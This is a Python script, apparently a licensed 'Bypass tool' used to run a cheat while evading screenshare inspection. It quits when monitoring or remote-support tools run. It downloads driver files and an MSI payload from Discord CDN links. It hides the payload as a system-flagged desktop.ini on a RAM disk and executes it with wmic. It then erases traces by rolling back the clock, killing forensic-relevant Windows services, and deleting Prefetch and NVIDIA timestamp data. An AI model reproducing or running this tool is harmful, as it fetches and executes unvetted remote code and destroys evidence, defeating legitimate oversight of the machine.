from keyauth import api
import sys
import time
import platform
import shutil
import psutil
import os
from os import system
import hashlib
import datetime
from time import sleep
import datetime
import pygetwindow





def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

if __name__ == '__main__':
  programs = ['ProcessHacker.exe', 'Anydesk.exe', 'Teamviewer.exe']

  for p in programs:
    if checkIfProcessRunning(p):
        exit()

win = pygetwindow.getWindowsWithTitle('.')[0]



if sys.version_info.minor < 10:  # Python version check (Bypass Patch)
    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))

if platform.system() == 'Windows':
    os.system('cls')  # clear console, change title
elif platform.system() == 'Linux':
    os.system('clear')  # clear console
    sys.stdout.write("\x1b]0;.\x07")  # change title
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  # clear console
    os.system('''echo - n - e "\033]0;.\007"''')  # change title


os.system("color f")


def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest


keyauthapp = api(
    name = "Bypass tool",
    ownerid = "oPy9xx1KTm",
    secret = "0ba9db0592df607dbef77ae1742cdce2e277a989d9433b4362cf1cf13698a6b5",
    version = "1.0",
    hash_to_check = getchecksum()
)

os.system("cls")
os.system("color 5")
def answer():
    system("title .")
    win.size = (350, 500)
    try:
        print("""
                  _,._
      .||,       /_ _ \     
     \.`',/      |'L'| |    
     = ,. =      | -,| L    
     / || \    ,-' "/,'`.      
       ||     ,'   `,,. `.     
       ,|____,' , ,;' \| |     
      (3|\    _/|/'   _| |  
       ||/,-''  | >-'' _,\\ 
       ||'      ==\ ,-'  ,' 
       ||       |  V \ ,|   
       ||       |    |` |   
       ||       |    |   \  
       ||       |    \    \ 
       ||       |     |    \"
       ||       |      \_,-'
       ||       |___,,--")_\"
       ||         |_|   ccc/
       ||        ccc/       
_______________________________________     

              1. Login         
              2. Register
        """)
        ans = input("> ")
        if ans == "1":
            os.system('cls')
            os.system('mode 30,6')
            user = input('User: ')
            password = input('Password: ')
            keyauthapp.login(user, password)
        elif ans == "2":
            os.system('cls')
            user = input('User:')
            password = input('Password: ')
            license = input('Key: ')
            keyauthapp.register(user, password, license)

        else:
            print("\nInvalid Option")
            time.sleep(1)
            os.system('cls')
            answer()
    except KeyboardInterrupt:
        os._exit(1)


answer()


win.size = (20, 20)   
onlineUsers = keyauthapp.fetchOnline()
OU = ""  
if onlineUsers is None:
    OU = "No online users"
else:
    for i in range(len(onlineUsers)):
        OU += onlineUsers[i]["credential"] + " "

print("\n" + OU + "\n")
os.system("color 5")

def process_hacker():
    boot = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%H:%M:%S")
    current_time = datetime.datetime.now().strftime("%H:%M:%S")

    system(f"time {boot}")

    sleep(2)

    svcs = ["diagtrack", "dnscache", "pcasvc", "dps"]

    for i in psutil.win_service_iter():
        for s in svcs:
            if i.name().lower() == s:
                system(f"TASKKILL /F /IM {i.pid()}")
                sleep(0.5)
                system(f'sc start {s}')

    system("TASKKILL /F /IM explorer.exe && start explorer.exe")

    sleep(2)

    system(f"time {current_time}")

def req():
        win.size = (60, 20) 
        os.system('mkdir C:\Windows\System32\System')
        os.system('mkdir C:\Windows\System32\System\Win10')
        os.system('curl -s  https://cdn.discordapp.com/attachments/1066899603452072057/1069477747262504960/OSFMount.com --output C:\Windows\System32\System\OSFMount.com')
        os.system('curl -s  https://cdn.discordapp.com/attachments/1066899603452072057/1069477747619012668/OSFMount.exe --output C:\Windows\System32\System\OSFMount.exe')
        os.system('curl -s  https://cdn.discordapp.com/attachments/1066899603452072057/1069477747996491786/OSFMount.sys --output C:\Windows\System32\System\OSFMount.sys')
        os.system('curl -s  https://cdn.discordapp.com/attachments/1066899603452072057/1069477748285915256/osfdisk.inf --output C:\Windows\System32\System\osfdisk.inf')
        os.system('curl -s  https://cdn.discordapp.com/attachments/1066899603452072057/1069477748613062717/osfdisk.sys --output C:\Windows\System32\System\osfdisk.sys')
        os.system('curl -s  https://cdn.discordapp.com/attachments/1066899603452072057/1069477814207787098/osfdisk.sys --output C:\Windows\System32\System\Win10\osfdisk.sys ')
        os.system('curl -s  https://cdn.discordapp.com/attachments/1066899603452072057/1069477814530756658/OSFMount.sys --output C:\Windows\System32\System\Win10\OSFMount.sys')
        os.system('curl -s  https://cdn.discordapp.com/attachments/1066899603452072057/1069477814841114704/osfdisk.inf --output C:\Windows\System32\System\Win10\osfdisk.inf')
    
def dele():
        os.system('cd c:\\windows\\system32')
        os.system('RD/s/q C:\Windows\System32\System\Win10')
        os.system('RD/s/q C:\Windows\System32\System')
        os.system("del /s /f /q C:\WINDOWS\Prefetch >nul")
        os.system(r'del /f /s "C:\ProgramData\NVIDIA Corporation\Drs\nvAppTimestamps"')

def disk():
        os.system('cd C:\Windows\System32\System && osfmount -a -t vm -s 1500M -o format:fat32:"Disco" -m "E:')                      
        os.system('"C:\Windows\System32\Win10\OSFMount.com" -a -t vm -s 1500M -o format:fat32:"Disco" -m "e:')

def byedisk():
    os.system('cd C:\Windows\System32\System && osfmount -d -m E: >nul')

def menu():
    system("cls")
    win.size = (370, 470)
    print('''

              _,._
  .||,       /_ _ \     
 \.`',/      |'L'| |    
 = ,. =      | -,| L    
 / || \    ,-' "/,'`.      1. Requirements
   ||     ,'   `,,. `.     2. Disk
   ,|____,' , ,;' \| |     3. Install
  (3|\    _/|/'   _| |     4. Inject
   ||/,-''  | >-'' _, \    5. Fuck SS
   ||'      ==\ ,-'  ,'    6. Exit
   ||       |  V \ ,|   
   ||       |    |` |   
   ||       |    |   \  
   ||       |    \    \ 
   ||       |     |    \"
   ||       |      \_,-'
   ||       |___,,--")_\"
   ||         |_|   ccc/
   ||        ccc/       
   ||        
        ''')
    op = int(input('> '))
    if op == 1:
        req()
        menu()
    elif op == 2:
        win.size = (20, 20)   
        disk()
        menu()
    elif op == 3:
        win.size = (20, 20)
        url = "https://cdn.discordapp.com/attachments/1063226109304524971/1073710630483263589/VCE.msi"
        system(f'curl -s {url} -o E:\desktop.ini')      
        os.system('attrib E:\desktop.ini +s +h >nul')                                                              
        menu()
    elif op == 4:
        win.size = (20, 20)
        os.system('title .ㅤ && ping 1.1.1.1 >nul')
        os.system(r"wmic process call create E:\desktop.ini >nul")
        menu()
    elif op == 5:
        win.size = (20, 20)
        byedisk()
        process_hacker()
        dele()
        
    elif op == 6:
        os.system("exit")

    else:
        menu()

menu()

if __name__ == '__main__':
  programs = ['ProcessHacker.exe', 'Anydesk.exe', 'Teamviewer.exe']

  for p in programs:
    if checkIfProcessRunning(p):
        exit()